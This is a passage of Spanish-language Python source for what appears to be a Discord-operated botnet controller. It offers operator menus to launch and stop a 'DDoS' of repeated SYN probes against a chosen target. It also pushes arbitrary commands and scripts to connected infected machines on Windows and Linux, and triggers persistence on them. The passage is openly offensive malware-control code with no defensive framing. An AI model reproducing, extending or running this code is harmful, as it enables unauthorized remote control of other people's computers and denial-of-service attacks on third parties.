message: message.author == ctx.author)\r\n                objetivo = objetivo.content.strip()\r\n                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                puerto = puerto.content.strip()\r\n                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                protocolo = protocolo.content.strip().upper()\r\n                if protocolo not in [\"TCP\", \"UDP\"]:\r\n                    await ctx.send(\"Protocolo no válido.\")\r\n                    return\r\n                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n            elif orden == \"2\":\r\n                comando_windows = \"stop_ddos\"\r\n                comando_linux = \"stop_ddos\"\r\n                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n            elif orden == \"3\":\r\n                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                comando_windows = comando_windows.content.strip()\r\n                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                comando_linux = comando_linux.content.strip()\r\n                enviar_comando(comando_windows, comando_linux)\r\n            elif orden == \"4\":\r\n                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                tipo = tipo.content.strip()\r\n\r\n                if tipo == \"1\":\r\n                    extension = \"py\"\r\n                    interprete_linux = \"python3 -c\"\r\n                    interprete_windows = \"python -c\"\r\n                elif tipo == \"2\":\r\n                    extension = \"sh\"\r\n                    interprete_linux = \"bash -c\"\r\n                    interprete_windows = \"powershell -Command\"\r\n                elif tipo == \"3\":\r\n                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                    extension = extension.content.strip()\r\n                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                    interprete_linux = interprete_linux.content.strip()\r\n                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                    interprete_windows = interprete_windows.content.strip()\r\n                else:\r\n                    await ctx.send(\"Opción inválida.\")\r\n                    return\r\n\r\n                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                metodo = metodo.content.strip()\r\n\r\n                if metodo == \"1\":\r\n                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n                    lineas = []\r\n                    while True:\r\n                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                        linea = linea.content.strip()\r\n                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n                            break\r\n                        lineas.append(linea)\r\n                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n                elif metodo == \"2\":\r\n                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                    ruta = ruta.content.strip()\r\n                    try:\r\n                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n                            script = archivo.read()\r\n                    except Exception as e:\r\n                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n                        return\r\n                else:\r\n                    await ctx.send(\"Opción inválida.\")\r\n                    return\r\n\r\n                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n\r\n                comando_windows = f'{interprete_windows} \"{script}\"'\r\n                comando_linux = f\"{interprete_linux} '{script}'\"\r\n\r\n                enviar_comando(comando_windows, comando_linux)\r\n            elif orden == \"5\":\r\n                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n                comando_windows = \"persistencia\"\r\n                comando_linux = \"persistencia\"\r\n                enviar_comando(comando_windows, comando_linux)\r\n            else:\r\n                await ctx.send(\"Opción no válida.\")\r\n                return\r\n        else:\r\n            await ctx.send(\"Opción no válida.\")\r\n            return\r\n    except Exception as e:\r\n        logging.error(f\"Error en el menú de comandos: {e}\")\r\n        await ctx.send(\"Error en el menú de comandos.\")\r\n\r\n@bot.command(name='ayuda')\r\nasync def ayuda_command(ctx):\r\n    \"\"\"\r\n    Comando de Discord para mostrar la ayuda del bot.\r\n    \"\"\"\r\n    help_text = \"\"\"\r\n    **Comandos disponibles:**\r\n\r\n    **!listar_bots**\r\n    - Lista los bots conectados al servidor.\r\n\r\n    **!enviar_comando <comando_windows> <comando_linux>**\r\n    - Envía un comando a los bots conectados.\r\n    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n\r\n    **!cerrar_conexion <bot_id>**\r\n    - Cierra la conexión con un bot específico"
        }
    ]
}